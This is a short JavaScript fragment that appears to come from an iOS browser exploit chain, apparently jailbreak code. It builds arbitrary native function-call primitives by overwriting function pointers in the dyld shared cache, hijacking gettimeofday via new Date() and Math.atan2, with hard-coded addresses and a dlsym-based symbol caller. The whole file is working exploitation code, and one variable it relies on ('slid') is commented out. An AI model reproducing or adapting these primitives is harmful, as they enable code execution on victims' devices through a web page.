var reserve_addr = 0x1a0000;
var gettimeofday_addy = 0x34d63d3c;
var slide = 0x0;
var base = 0x0;
//var slid = 0x0;

function get_dyld_shc_slide() {
	return read_u32((slide << 12) + reserve_addr + 20);
}

function call(addy) {
	var dyld_shc_slide = get_dyld_shc_slide();
	var tmp = read_u32(gettimeofday_addy + dyld_shc_slide);
	write_u32(gettimeofday_addy + dyld_shc_slide, addy);
	var d = new Date();
	write_u32(gettimeofday_addy + dyld_shc_slide, tmp);
}

function call4arg(addy, r0, r1, r2, r3) {
	var arg1 = new Int64("0x" + pad_left(r1.toString(16), '0', 8) + pad_left(r0.toString(16), '0', 8));
	var arg2 = new Int64("0x" + pad_left(r3.toString(16), '0', 8) + pad_left(r2.toString(16), '0', 8));

	arg1d = arg1.asDouble();
	arg2d = arg2.asDouble();

	delete arg1;
	delete arg2;
		
	var dyld_shc_slide = get_dyld_shc_slide();

	tmp = read_u32(0x346afc84 + dyld_shc_slide);
	write_u32(0x346afc84 + dyld_shc_slide, addy);
	ret = Math.atan2(arg1d, arg2d);
	write_u32(0x346afc84 + dyld_shc_slide, tmp);
	
	delete tmp;
	delete arg1d;
	delete arg2d;
	
	return (parseInt(Int64.fromDouble(ret)) & 0xffffffff) >>> 0;
}

/*
 *  call with symbol
 */
function calls4arg(sym, r0, r1, r2, r3) {
	var dlsym_addy = read_u32(0x1a0000 + 24 + slid);
	var shc_slide = read_u32(0x1a0000 + 20 + slid);
	var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, sptr(sym), 0, 0);
	return call4arg(addy, r0, r1, r2, r3);
}
